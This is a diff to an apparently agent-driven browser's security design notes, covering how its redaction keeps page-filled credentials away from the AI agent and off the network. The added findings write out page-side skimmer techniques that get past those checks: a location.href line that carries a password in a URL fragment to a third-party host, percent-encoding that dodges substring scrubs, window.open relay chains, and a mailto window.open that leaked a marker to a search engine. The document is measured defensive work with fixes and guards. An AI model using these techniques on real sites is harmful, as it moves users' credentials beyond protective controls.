@@ -66,8 +66,11 @@ containment rests on.
 | Copy value into a `<div>` and have the agent read it | Redaction while the fill is tainted — **implemented and measured** (G19; residuals below) |
 | Copy value into the page title, the URL, a link target, an option label, or an element's own tag name | The same redaction, once its scope was widened past `SnapshotNode` — see "Redaction: what it covers" (G19b-e) |
 | Split the value with one invisible character the renderer strips on the way out | The strip moved to walk time, so the redactor reads the bytes the model gets (G19g) |
-| `window.open` a page — same origin or foreign — whose URL or title holds the value | Needles keyed by origin, plus the opener's origin on a tab Aperture creates for a page (G19d, G19f, G19i) |
+| `window.open` a page — same origin or foreign — whose URL or title holds the value | Needles keyed by origin, plus the opener's whole SCOPE on a tab Aperture creates for a page, so a relay chain stays covered past the first hop (G19d, G19f, G19i, G19m) |
 | Navigate the filled tab itself to a URL holding the value, so the navigation drops the needles | Navigation no longer drops them (G19h) |
+| Navigate the filled tab itself to a THIRD-PARTY origin with the value in the **fragment** — inert target, nothing sent to any server | The tab carries the origins it has left, so coverage follows the value rather than the tab (G19k) |
+| Put the value in a URL and let the browser percent-encode it, so the substring scrub misses it | Every URL surface goes through one `redactUrl`, which searches the decoded readings (G19b, G19c, G19j, G19j2) |
+| `window.open('mailto:…' + value)`, so Aperture's own search fallback puts it on the network | A page-chosen `window.open` target with a non-web scheme is refused, not searched (G19l) |
 | `google.com.evil.com`, `paypaI.com` | Registrable-domain comparison in punycode; confusable check at record creation |
 | Exfiltrate via the page's own `fetch()` | **Not preventable and not in scope** — that origin already has the credential |
 
@@ -159,7 +162,14 @@ discipline:
   the page's own title and URL to Notion as the caption of the uploaded image.
   The image never enters agent context, so this is not an agent-context leak —
   it is a disclosure to a third party of a credential Aperture wrote into that
-  page moments earlier. Both fields are needle-scrubbed now.
+  page moments earlier. Both fields are needle-scrubbed, **at both call sites**:
+  the agent's tool and the human's toolbar button (`capture:page` in
+  `src/main/ipc.ts`), which reaches the same `routeCapture` with the same two
+  strings and had no scrub at all for one commit. The URL takes `redactUrl`, not
+  the text scrub. `browser_capture`'s own reply also carries `fellBackBecause` —
+  a third party's error text, in Aperture's voice outside the envelope, and the
+  one prose channel in that file the nine-site audit never counted; it goes
+  through `safeForAgent` now.
 - **The residual that remains, and it is the same one:** every page-authored
   string outside an envelope is now `quote()`-capped, so the worst a page
   achieves is a strange quoted string inside a sentence that is visibly
@@ -252,21 +262,53 @@ reader took "`SnapshotNode.name` → covered by `redactObserved`" as a statement
 about the mechanism when it was a statement about one tab. A row is only as
 strong as the needle set its surface is scrubbed against.
 
-| surface | covered by | scope | marker |
-|---|---|---|---|
-| `SnapshotNode.name` / `.value` / `.text` / `.rows` | `redactObserved`, both branches | the observed tab's origin scope | `(filled, value withheld)` |
-| `SnapshotNode.href` | `redactObserved` → `scrubUrlish`, needle branch | same | `(filled,value-withheld)` — rendered unquoted |
-| `Snapshot.title` | `redactObserved` | same | `(filled, value withheld)` |
-| `Snapshot.url` | `redactObserved` → `scrubUrlish` | same | `(filled,value-withheld)` — rendered unquoted |
-| `browser_read` innerText | `stripFormat` then `redactFreeText` + live `taintedValues` | same | `(filled, value withheld)` |
-| `browser_tabs list` | `safeTabLine` / `redactFreeText`, **per listed tab** | each line against ITS OWN tab's origin scope | both |
-| every `browser_act` / `select` / `navigate` / `attach` prose channel | `safeForAgent` | the acting tab's origin scope | `(filled, value withheld)` |
-| `browser_capture`'s Notion caption and source URL | `redactFreeText` | the captured tab's origin scope | both |
+**Read the SCRUB column second.** There are two scrubbers and they are not
+interchangeable. `redactFreeText` matches the bytes as they are; `redactUrl`
+also matches the DECODED readings, because the URL parser is an encoder and
+whatever the page wrote into a URL comes back escaped. A URL scrubbed with the
+text scrubber is a leak, and it was one on three surfaces at once — the column
+exists because "the right marker with the wrong scrub" is indistinguishable
+from a correct call at the call site.
 
-A tab's **origin scope** is the origin it is currently on, plus the origin of
-the page that asked Aperture to open it (`TabManager.originScope`). Both halves
-are load-bearing and each has its own guard — G19f for the first, G19i for the
-second.
+| surface | covered by | scrub | scope | marker |
+|---|---|---|---|---|
+| `SnapshotNode.name` / `.value` / `.text` / `.rows` | `redactObserved`, both branches | text | the observed tab's origin scope | `(filled, value withheld)` |
+| `SnapshotNode.href` | `redactObserved` → `scrubUrlish`, needle branch | **URL** | same | `(filled,value-withheld)` — rendered unquoted |
+| `Snapshot.title` | `redactObserved` | text | same | `(filled, value withheld)` |
+| `Snapshot.url` | `redactObserved` → `scrubUrlish` | **URL** | same | `(filled,value-withheld)` — rendered unquoted |
+| `browser_read` innerText | `stripFormat` then `redactFreeText` + live `taintedValues` | text | same | `(filled, value withheld)` |
+| `browser_tabs list` title | `safeTabLine`, **per listed tab** | text | each line against ITS OWN tab's origin scope | `(filled, value withheld)` |
+| `browser_tabs list` URL | `redactUrl`, **per listed tab** | **URL** | same | `(filled,value-withheld)` |
+| `browser_navigate`'s `loaded …` line | `safeUrlForAgent` | **URL** | the navigated tab's origin scope | `(filled,value-withheld)` |
+| every other `browser_act` / `select` / `navigate` / `attach` / `capture` prose channel | `safeForAgent` | text | the acting tab's origin scope | `(filled, value withheld)` |
+| `browser_capture`'s Notion caption | `redactFreeText` | text | the captured tab's origin scope | `(filled, value withheld)` |
+| `browser_capture`'s Notion source URL | `redactUrl` | **URL** | same | `(filled,value-withheld)` |
+| the **human's** toolbar capture (`capture:page` IPC) — same two fields, same Notion | `redactFreeText` / `redactUrl` | both | the active tab's origin scope | both |
+
+The last row is the tenth sink and it is here because of a sentence rather than
+a probe. This file recorded "Both fields are needle-scrubbed now" about
+`browser_capture`. `routeCapture` has **two** call sites: the agent's tool and
+the human's toolbar button, which forwards the same page-written
+`document.title` and `history.replaceState` URL to the same Notion page. The
+second had no scrub of any kind. The agent cannot press that button — it does
+not need to; the skimmer writes the title and waits for the human to file a
+screenshot. `test/urlsurfaces.test.ts` now asserts over the call sites rather
+than over the instance, because the failure was never "somebody forgot a
+scrub" — it was **a helper written for a sentence and wired to some of the
+places the sentence applies**.
+
+A tab's **origin scope** is the origin it is currently on, plus every origin it
+CARRIES (`TabManager.originScope`): the whole scope of the page that asked
+Aperture to open it, and every origin it has navigated away from. All three
+parts are load-bearing and each has its own guard — G19f for the current
+origin, G19i for the opener, G19m for the opener chain past depth 1, and G19k
+for the origins it has left.
+
+**The rule underneath is one sentence: coverage follows the value, not the
+tab's present location.** Two findings in one gate came from the other reading.
+A tab opened by a filled page was covered and a tab that *walked itself out of*
+a filled origin was not, even though both are the same page moving the same
+value the same distance.
 
 ### Needle scope — keyed by ORIGIN (2026-08-05)
 
@@ -297,6 +339,36 @@ The second half is not bookkeeping — a skimmer can `window.open` a *foreign*
 origin with the value in the URL, and nothing else in the system knows the value
 went there. `everyNeedle` and `redactAcrossTabs` are deleted; there is nothing
 left for them to do.
+
+**And that was still one reading short — corrected 2026-08-05, second gate.**
+"Where the tab is, plus who opened it" is a fact about the TAB. The thing that
+needs covering is the VALUE. The second gate measured both ways that gap opens:
+
+- **The tab's own prior origin (F-E).** `location.href =
+  'http://third-party/inert.html#' + password`. The target has no script, never
+  reads its fragment, and **a fragment is never sent to a server** — measured,
+  the third party's log showed one request for `/inert.html` and nothing else.
+  Nothing was exfiltrated; the credential simply moved out of the redactor's
+  reach, and came back verbatim in the `browser_act` result that caused the
+  navigation, the next `browser_snapshot`, and the tab listing.
+- **The opener chain past depth 1 (F-D).** `openerOrigin` recorded the opener's
+  *current origin* rather than its *scope*, so `filled → A → B` left B with an
+  opener that holds no needles.
+
+A tab now carries a SET: the opener's whole scope at creation, plus every origin
+it navigates away from, only ever added to. `TabRecord.carriedOrigins` argues
+the cost — the over-redaction is bounded by the needle TTL, not by the set, and
+the set is deliberately uncapped because any eviction policy could drop the one
+origin that mattered.
+
+**One claim retracted.** This section used to say origin scope was strictly
+greater in coverage than the old cross-tab union. On the one surface the union
+actually lived on — the tab listing, scrubbed against every needle in the
+browser — that was false: the union would have caught a filled tab that had
+navigated itself away, and origin-plus-opener did not. The two were
+*incomparable* there. Closing F-E is what makes the sentence true, and it is
+stated here as a consequence of the fix rather than as a property the design
+always had.
 
 **Plaintext lifetime, corrected.** Needles used to be dropped early on a
 document-replacing navigation. That drop is gone, deliberately: the navigation a
@@ -331,15 +403,52 @@ alphabet. Three of Aperture's own transformations sat between them:
   `+`-for-space spelling), which also closes the disclosure where an invisible
   separator survived as `%E2%80%AD` because the URL parse ran before the strip.
 
+  **And it was wired to two of the five places it applies** — corrected
+  2026-08-05, second gate. `scrubUrlish` covered `Snapshot.url` and
+  `SnapshotNode.href`; `browser_tabs list`, `browser_navigate`'s `loaded …`
+  line and `browser_capture`'s Notion source URL used the plain scrub, which
+  does not decode. Measured: one same-origin self-navigation, and the snapshot
+  header came back clean while the listing and the `loaded …` line carried
+  `?pw=guard-pw%E2%80%AD-93a1` (F-C). **No adversary is required for the wider
+  class**: any password containing a space, `#`, `&`, `%`, `+`, a quote or any
+  non-ASCII character is encoded by the URL parser on those surfaces, so this
+  fired for an ordinary user with an ordinary password. There is now one
+  `redactUrl` in `engine.ts`, `redactFreeText` has lost its `marker` parameter
+  so no caller can reach for the URL marker with the text scrub, and
+  `test/urlsurfaces.test.ts` asserts that no third file names `REDACTED_HREF`.
+
 **Residuals, stated exactly.** *Page-side* transformation defeats substring
 matching and always will: reversed, base64'd, or one character per element is
 not caught. Truncation boundaries can leak fragments, which is why
 `safeForAgent` scrubs before `quote()` as well as after, and why the walker's
 own `MAX_NAME` cut can still shorten a long value into an unmatchable fragment.
-A value shorter than six characters is never registered. And a tab that
-navigates ITSELF to a foreign origin carrying the value is not covered — that
-navigation hands the value to the target origin's server, which is exfiltration
-by a channel the "cannot phone home" adversary does not have.
+A value shorter than six characters is never registered.
+
+**A residual that was filed and was not one — retracted 2026-08-05, second
+gate.** This list used to end: *"a tab that navigates ITSELF to a foreign origin
+carrying the value is not covered — that navigation hands the value to the
+target origin's server, which is exfiltration by a channel the 'cannot phone
+home' adversary does not have."*
+
+**The premise is false.** It is true of a query string and false of a fragment,
+and a fragment is where a page would put it:
+
+```js
+location.href = 'https://any-third-party.example/#' + password;
+```
+
+A fragment is **never sent to a server**. Measured rather than argued: the
+third-party fixture's request log holds one line, `/inert.html`, with no
+fragment. The target need not be attacker-controlled, need not have script, and
+need not read anything — `inert.html` in `test/fixtures` has no script at all,
+and there is a comment in it saying not to add one. Nothing was exfiltrated. The
+credential moved from a place the redactor covers to a place it did not, inside
+one browser, in one line, and came back verbatim on three agent-facing surfaces
+including the `browser_act` result that caused the navigation. Closed by
+`carriedOrigins`; guarded by G19k.
+
+The lesson is not about fragments. A residual is a claim, and this one was
+accepted for a whole review cycle on a plausible sentence nobody measured.
 
 **One cosmetic artifact**, recorded so nobody reads it as a bug: because
 `safeForAgent` scrubs on both sides of `quote()`, a needle that is itself a
@@ -353,9 +462,14 @@ G19d (the listing, against a genuine carrier tab), G19e (an element's own tag
 name), G19f (an unqualified `browser_snapshot` / `browser_read` on that
 carrier), G19g (a value split by one invisible character, across title, value,
 name, rows and href), G19h (a document-replacing navigation to a URL carrying
-the value), G19i (a carrier on a *foreign* origin) — 50 guards in the `allow`
-phase — and, for the recurrence mechanism rather than the instances,
-`test/completeness.test.ts`. Its ruling table is total over **two** axes: what
+the value), G19i (a carrier on a *foreign* origin), G19j and G19j2 (the tab
+listing and the `loaded …` line, against a value the URL parser
+percent-encoded), G19k (a cross-origin self-navigation with the value in the
+**fragment**), G19l (a `window.open` scheme Aperture would otherwise have turned
+into a third-party search), G19m (a two-hop opener chain) — 55 guards in the
+`allow` phase — and, for the recurrence mechanism rather than the instances,
+`test/completeness.test.ts` and `test/urlsurfaces.test.ts`. The first is total
+over **two** axes: what
 the diff reports, and whether the field can carry a secret. The second axis is
 executable, and since 2026-08-05 "rendered" is **measured** rather than listed:
 a canary is planted in every string-bearing field of both types, `renderFull` is
@@ -363,6 +477,25 @@ run, and the fields whose canary survives are checked against their rulings. A
 new rendered page-controlled string ruled `not-page-text` — the one mistake the
 old seven-name check could not see — now fails by name. What that file still
 cannot do is falsify a `not-page-text` claim itself; its own header says so.
+
+`test/urlsurfaces.test.ts` covers the other recurrence mechanism, the one every
+finding of the second gate shares: **a helper written for a sentence and wired
+to some of the places that sentence applies.** It cannot be closed the way
+`completeness.test.ts` closed its own class, because these are call sites rather
+than type members and no runtime observation enumerates them — so it asserts
+over the source, which is weaker and is the strongest instrument available for
+"did every call site get the treatment". It fails if a `routeCapture` call site
+stops scrubbing either field, if a third file names `REDACTED_HREF`, or if a
+second implementation of "which origin is this URL on" appears.
+
+**One process guarantee, not a security one.** `bench/guards.mjs` refuses to
+start when `out/main/index.js` is older than anything under `src/`, and prints
+the artifact's SHA-256 in its header and in the RESULT line. Three separate
+incidents in this project were a green guard run against a stale artifact, and
+that failure is silent by construction — a green run against the wrong build is
+byte-identical to a green run against the right one. The refusal cannot be
+forgotten, because forgetting is the mistake; the hash makes a pasted verdict
+name what produced it.
 
 ## `GET /metrics`: an authenticated read-only endpoint (2026-08-02)
 
@@ -412,6 +545,50 @@ wedge may happen under a human's use rather than the bench's
 (docs/design/tier3.md §2.2). The counterpart, wrapping the product to capture
 its own child logs, is ruled OUT: the product IS the child, and a self-capture
 wrapper is its own project.
+
+## Finding: a page could make Aperture put its own bytes on the network (2026-08-05)
+
+**Not a redaction finding.** Everything else in this file is containment — a
+value the agent might be shown. This one is Aperture making an outbound request
+on a page's behalf, to a host the page never named.
+
+**Mechanism.** `normalizeUrl` (`src/main/tabs.ts`) answers a disallowed scheme
+with `searchFor(s)` — `duckduckgo.com/?q=<the whole string>`. That is the right
+answer for a human typing "weather" into the address bar, and it is what the
+scheme allowlist's own regression test asserts. `setWindowOpenHandler` then fed
+it whatever a **page** passed to `window.open`, and Chromium hands that over
+already resolved and absolute.
+
+**Measured**, shipped build, one line of page script:
+
+```js
+window.open('mailto:nobody@example.invalid?subject=' + MARKER);
+```
+
+```
+* t5 [default] complete "mailto:nobody@example.invalid?subject=WOPENMARKER93a1 at DuckDuckGo"
+    https://duckduckgo.com/?q=mailto%3Anobody%40example.invalid%3Fsubject%3DWOPENMARKER93a1&ia=web
+```
+
+A marker rather than the seeded credential, deliberately — the mechanism does
+not care what the bytes are, and a guard that proves this by mailing a password
+to a search engine is worse than the bug.
+
+**Why it matters given that a page can already `fetch()`.** This file's own
+injection table says exfiltration by the page's own `fetch()` is not preventable
+and not in scope, and that is true of an unconstrained origin. The adversary the
+needle mechanism exists for is narrower: *injected script on an otherwise-honest
+origin*. An honest origin ships a Content-Security-Policy, and `connect-src
+'self'` forbids that `fetch()`. It does not forbid `window.open` to a scheme the
+browser hands off to another application — so Aperture was supplying an
+exfiltration channel to precisely the adversary that was supposed not to have
+one, and turning a handoff into a top-level navigation of its own making.
+
+**Fixed** by checking the scheme in the window-open handler rather than leaving
+it to `normalizeUrl`: a page-chosen target with a non-web scheme is refused, and
+no tab is created. The search affordance is for input a human or the agent typed
+and stays exactly as it was. **Guarded by G19l**, and the sabotage row for it
+reproduced the DuckDuckGo line verbatim.
 
 ## Finding: a link's href could change under a stable label with no report (2026-08-01)
 
